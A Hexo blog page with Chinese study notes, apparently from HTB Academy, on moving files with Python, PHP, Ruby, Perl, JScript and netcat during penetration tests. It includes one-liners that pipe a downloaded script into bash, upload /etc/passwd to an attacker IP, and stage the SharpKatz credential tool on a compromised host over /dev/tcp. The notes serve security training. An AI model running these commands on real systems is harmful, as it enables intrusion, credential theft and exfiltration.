@@ -1,0 +1,394 @@
+
+<!DOCTYPE html>
+<html lang="en ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Salve || Other_File_Transfer</title>
+    <meta name="author" content="TiAmo">
+    <meta name="description" content="Buona notte ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/avatar.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>加载过慢请开启缓存(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Salve</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+        <a href="">
+            <span>
+                <a-icon type="compass" theme="filled" />
+            </span>
+            <span>英文博客</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Salve</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+            <a href="">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="compass" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">英文博客</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>Other_File_Transfer </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/7/6
+        </span>
+
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/base" style=color:#03a9f4>
+                    base
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <h1 id="Transfering-Files-with-Code"><a href="#Transfering-Files-with-Code" class="headerlink" title="Transfering Files with Code"></a>Transfering Files with Code</h1><p>在我们的目标机器上安装不同的编程语言是很常见的。Python、PHP、Perl和Ruby等编程语言在Linux发行版中很常见，但也可以安装在Windows上，尽管这远不常见。 我们可以使用一些Windows默认应用程序，如cscript和mshta，来执行JavaScript或VBScript代码。JavaScript也可以在Linux主机上运行。 根据维基百科，大约有700种编程语言，我们可以用任何编程语言创建代码，将指令下载、上传或执行到操作系统。本节将提供一些使用通用编程语言的示例。</p>
+<span id="more"></span>
+
+<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>Python是一种流行的编程语言。目前支持版本3，但我们可能会发现Python 2.7版本仍然存在的服务器。Python可以使用选项-c从操作系统命令行运行一行代码。让我们看一些例子：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ python2.7 -c &#39;import urllib;urllib.urlretrieve (&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;LinEnum.sh&quot;)&#39;
+</code></pre>
+<pre><code class="shell-session">Tanin@htb[/htb]$ python3 -c &#39;import urllib.request;urllib.request.urlretrieve(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;LinEnum.sh&quot;)&#39;
+</code></pre>
+<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>PHP也非常流行，它提供了多种文件传输方法。根据W3Techs( <a target="_blank" rel="noopener" href="https://w3techs.com/technologies/details/pl-php">According to W3Techs’ data</a>)的数据，77.4%的网站使用已知的服务器端编程语言使用PHP。尽管信息并不精确，而且数量可能略低，但我们在执行攻击性操作时经常会遇到使用PHP的web服务。 让我们看一些使用PHP下载文件的示例。 在下面的示例中，我们将使用PHP  <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.file-get-contents.php">file_get_contents() module</a> 从网站下载内容，并结合 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.file-put-contents.php">file_put_contents() module</a>将文件保存到目录中。PHP可以用于使用选项-r从操作系统命令行运行一行代码。</p>
+<h4 id="PHP-Download-with-File-get-contents"><a href="#PHP-Download-with-File-get-contents" class="headerlink" title="PHP Download with File_get_contents()"></a>PHP Download with File_get_contents()</h4><pre><code class="shell-session">Tanin@htb[/htb]$ php -r &#39;$file = file_get_contents(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;); file_put_contents(&quot;LinEnum.sh&quot;,$file);&#39;
+</code></pre>
+<p>file_get_contents（）和file_put_contends（）的替代方案是fpopen（）模块。我们可以使用这个模块打开一个URL，读取它的内容并将其保存到一个文件中。</p>
+<h4 id="PHP-Download-with-Fopen"><a href="#PHP-Download-with-Fopen" class="headerlink" title="PHP Download with Fopen()"></a>PHP Download with Fopen()</h4><pre><code class="shell-session">php -r &#39;const BUFFER = 1024; $fremote = fopen(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;rb&quot;); $flocal = fopen(&quot;LinEnum.sh&quot;, &quot;wb&quot;); while ($buffer = fread($fremote, BUFFER)) &#123; fwrite($flocal, $buffer); &#125; fclose($flocal); fclose($fremote);&#39;
+</code></pre>
+<p>这段代码看起来是一个简单的文件下载操作，它尝试从指定的 URL 下载 <code>LinEnum.sh</code> 文件，并将其保存到本地。</p>
+<p>具体来说，代码的含义如下：</p>
+<pre><code class="php">fopen(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;rb&quot;);
+</code></pre>
+<p>该行代码打开指定 URL 的远程文件，使用 <code>&quot;rb&quot;</code> 模式以二进制方式读取文件内容。</p>
+<pre><code class="php">$flocal = fopen(&quot;LinEnum.sh&quot;, &quot;wb&quot;);
+</code></pre>
+<p>该行代码创建一个名为 <code>LinEnum.sh</code> 的本地文件，使用 <code>&quot;wb&quot;</code> 模式以二进制方式写入文件内容。</p>
+<pre><code class="php">while ($buffer = fread($fremote, BUFFER)) &#123;
+    fwrite($flocal, $buffer);
+&#125;
+</code></pre>
+<p>该循环代码从远程文件中读取数据块，并将数据块写入本地文件，直到远程文件的所有数据被读取完毕。</p>
+<pre><code class="php">fclose($flocal);
+fclose($fremote);
+</code></pre>
+<p>最后，代码关闭打开的本地文件和远程文件。</p>
+<p>请注意，这只是一段代码片段，缺少变量的定义和完整的执行环境。要使其正常工作，您需要在代码中定义 <code>BUFFER</code> 常量的大小，并确保您有适当的文件读写权限。另外，请确保从远程服务器下载的文件内容符合您的预期，并采取安全措施来验证和审查远程文件的来源和内容。</p>
+<p>我们也可以将下载的内容发送到管道，类似于我们在上一节中使用cURL和wget执行的无文件示例。</p>
+<h4 id="PHP-Download-a-File-and-Pipe-it-to-Bash"><a href="#PHP-Download-a-File-and-Pipe-it-to-Bash" class="headerlink" title="PHP Download a File and Pipe it to Bash"></a>PHP Download a File and Pipe it to Bash</h4><pre><code class="shell-session">Tanin@htb[/htb]$ php -r &#39;$lines = @file(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;); foreach ($lines as $line_num =&gt; $line) &#123; echo $line; &#125;&#39; | bash
+</code></pre>
+<p>这段代码使用 PHP 和 Bash 结合执行了一系列操作。具体来说，它从指定的 URL 下载 <code>LinEnum.sh</code> 文件，然后通过管道将文件内容传递给 Bash 来执行。</p>
+<p>以下是代码的解释：</p>
+<pre><code class="php">$lines = @file(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;);
+</code></pre>
+<p>这行代码使用 <code>file()</code> 函数从指定的 URL 下载文件，并将文件内容读取到 <code>$lines</code> 数组中。<code>@</code> 符号用于忽略可能出现的错误。</p>
+<pre><code class="php">foreach ($lines as $line_num =&gt; $line) &#123;
+    echo $line;
+&#125;
+</code></pre>
+<p>这个循环遍历 <code>$lines</code> 数组中的每一行，并使用 <code>echo</code> 打印每一行的内容。这样可以将下载的文件内容输出到标准输出。</p>
+<pre><code class="bash">| bash
+</code></pre>
+<p>通过管道 <code>|</code> 将 PHP 的输出传递给 Bash，即将下载的文件内容传递给 Bash 执行。</p>
+<p>这段代码的目的是将远程文件 <code>LinEnum.sh</code> 的内容下载并传递给 Bash 解释器执行。请注意，执行来自远程源的代码片段可能存在安全风险，因此在运行此代码之前，请确保您信任远程文件的来源，并且您已经仔细审查了其中的内容。</p>
+<h2 id="Other-Languages"><a href="#Other-Languages" class="headerlink" title="Other Languages"></a>Other Languages</h2><p>Ruby和Perl是其他流行的语言，也可以用于传输文件。这两种编程语言还支持使用选项-e从操作系统命令行运行一行程序。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ ruby -e &#39;require &quot;net/http&quot;; File.write(&quot;LinEnum.sh&quot;, Net::HTTP.get(URI.parse(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;)))&#39;
+</code></pre>
+<h4 id="Perl-Download-a-File"><a href="#Perl-Download-a-File" class="headerlink" title="Perl - Download a File"></a>Perl - Download a File</h4><pre><code class="shell-session">Tanin@htb[/htb]$ perl -e &#39;use LWP::Simple; getstore(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;LinEnum.sh&quot;);&#39;
+</code></pre>
+<h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><p>JavaScript是一种脚本或编程语言，允许您在网页上实现复杂的功能。与其他编程语言一样，我们可以将它用于许多不同的事情。 以下JavaScript代码基于本文，我们可以使用它下载一个文件。我们将创建一个名为wget.js的文件，并保存以下内容：</p>
+<pre><code class="javascript">var WinHttpReq = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);
+WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), /*async=*/false);
+WinHttpReq.Send();
+BinStream = new ActiveXObject(&quot;ADODB.Stream&quot;);
+BinStream.Type = 1;
+BinStream.Open();
+BinStream.Write(WinHttpReq.ResponseBody);
+BinStream.SaveToFile(WScript.Arguments(1));
+</code></pre>
+<p>我们可以从Windows命令提示符或PowerShell终端使用以下命令来执行JavaScript代码并下载文件。</p>
+<pre><code class="cmd-session">C:\htb&gt; cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
+</code></pre>
+<h2 id="Upload-Operations-using-Python3"><a href="#Upload-Operations-using-Python3" class="headerlink" title="Upload Operations using Python3"></a>Upload Operations using Python3</h2><p>如果我们想上传文件，我们需要了解特定编程语言中执行上传操作的函数。Python3请求模块允许您使用Python发送HTTP请求（GET、POST、PUT等）。如果我们想将文件上传到Python3上传服务器，我们可以使用以下代码。</p>
+<h4 id="Starting-the-Python-uploadserver-Module"><a href="#Starting-the-Python-uploadserver-Module" class="headerlink" title="Starting the Python uploadserver Module"></a>Starting the Python uploadserver Module</h4><pre><code class="shell-session">Tanin@htb[/htb]$ python3 -m uploadserver 
+
+File upload available at /upload
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre>
+<h4 id="Uploading-a-File-Using-a-Python-One-liner"><a href="#Uploading-a-File-Using-a-Python-One-liner" class="headerlink" title="Uploading a File Using a Python One-liner"></a>Uploading a File Using a Python One-liner</h4><pre><code class="shell-session">Tanin@htb[/htb]$ python3 -c &#39;import requests;requests.post(&quot;http://192.168.49.128:8000/upload&quot;,files=&#123;&quot;files&quot;:open(&quot;/etc/passwd&quot;,&quot;rb&quot;)&#125;)&#39;
+</code></pre>
+<h2 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h2><p><a target="_blank" rel="noopener" href="https://sectools.org/tool/netcat/">Netcat</a> （通常缩写为nc）是一种计算机网络实用程序，用于使用TCP或UDP读取和写入网络连接，这意味着我们可以将其用于文件传输操作。 最初的Netcat是由霍比特人于1995年发行的，但尽管它很受欢迎，但一直没有得到维护。该工具的灵活性和实用性促使Nmap项目生产了 <a target="_blank" rel="noopener" href="https://nmap.org/ncat/">Ncat</a>,这是一种现代的重新实现，支持SSL、IPv6、SOCKS和HTTP代理、连接代理等。 在本节中，我们将同时使用原始的Netcat和Ncat。</p>
+<h2 id="File-Transfer-with-Netcat-and-Ncat"><a href="#File-Transfer-with-Netcat-and-Ncat" class="headerlink" title="File Transfer with Netcat and Ncat"></a>File Transfer with Netcat and Ncat</h2><p>目标或攻击机器可以用来启动连接，如果防火墙阻止访问目标，这很有帮助。让我们创建一个示例，并将一个工具转移到我们的目标。 在这个例子中，我们将把SharpKatz.exe从我们的Pwnbox转移到受损的机器上。我们将使用两种方法。让我们完成第一个。 我们将首先在受损的机器上启动Netcat（nc），使用选项-l进行侦听，使用选项-p 8000选择要侦听的端口，然后使用一个大于&gt;的值并后跟文件名SharpKatz.exe重定向stdout。</p>
+<pre><code class="shell-session">victim@target:~$ nc -l -p 8000 &gt; SharpKatz.exe
+</code></pre>
+<p>如果被破坏的机器正在使用Ncat，我们只需要指定–recv-only来在文件传输完成后关闭连接。</p>
+<pre><code class="shell-session">victim@target:~$ ncat -l -p 8000 --recv-only &gt; SharpKatz.exe
+</code></pre>
+<p>从我们的攻击主机，我们将使用Netcat连接到端口8000上的受损机器，并将文件SharpKatz.exe作为输入发送到Netcat。选项-q0将告诉Netcat在连接完成后关闭连接。这样，我们就可以知道文件传输何时完成。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
+Tanin@htb[/htb]$ # Example using Original Netcat
+Tanin@htb[/htb]$ nc -q 0 192.168.49.128 8000 &lt; SharpKatz.exe
+</code></pre>
+<p>通过在我们的攻击主机上使用Ncat，我们可以选择–send-only而不是-q。当在连接和侦听模式中都使用–send-only标志时，一旦Ncat的输入耗尽，就会提示其终止。通常，Ncat会继续运行，直到网络连接关闭，因为远程侧可能会传输额外的数据。但是，使用–send-only，不需要预测更多传入信息。</p>
+<pre><code class="shell-session"> ncat --send-only 192.168.49.128 8000 &lt; SharpKatz.exe
+</code></pre>
+<p>如果我们的受损机器上没有Netcat或Ncat，Bash支持在伪设备文件&#x2F;dev&#x2F;TCP&#x2F;上进行读&#x2F;写操作。 写入这个特定的文件会使Bash打开到host:port的TCP连接，并且这个功能可以用于文件传输。</p>
+<h4 id="NetCat-Sending-File-as-Input-to-Netcat"><a href="#NetCat-Sending-File-as-Input-to-Netcat" class="headerlink" title="NetCat - Sending File as Input to Netcat"></a>NetCat - Sending File as Input to Netcat</h4><pre><code class="shell-session">Tanin@htb[/htb]$ # Example using Original Netcat
+Tanin@htb[/htb]$ sudo nc -l -p 443 -q 0 &lt; SharpKatz.exe
+</code></pre>
+<h4 id="NetCat-Sending-File-as-Input-to-Netcat-1"><a href="#NetCat-Sending-File-as-Input-to-Netcat-1" class="headerlink" title="NetCat - Sending File as Input to Netcat"></a>NetCat - Sending File as Input to Netcat</h4><pre><code class="shell-session">Tanin@htb[/htb]$ # Example using Ncat
+Tanin@htb[/htb]$ sudo ncat -l -p 443 --send-only &lt; SharpKatz.exe
+</code></pre>
+<h4 id="Compromised-Machine-Connecting-to-Netcat-Using-x2F-dev-x2F-tcp-to-Receive-the-File"><a href="#Compromised-Machine-Connecting-to-Netcat-Using-x2F-dev-x2F-tcp-to-Receive-the-File" class="headerlink" title="Compromised Machine Connecting to Netcat Using &#x2F;dev&#x2F;tcp to Receive the File"></a>Compromised Machine Connecting to Netcat Using &#x2F;dev&#x2F;tcp to Receive the File</h4><pre><code class="shell-session">victim@target:~$ cat &lt; /dev/tcp/192.168.49.128/443 &gt; SharpKatz.exe
+</code></pre>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2023 Salve
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @TiAmo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'en',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+</body>
+
+</html>
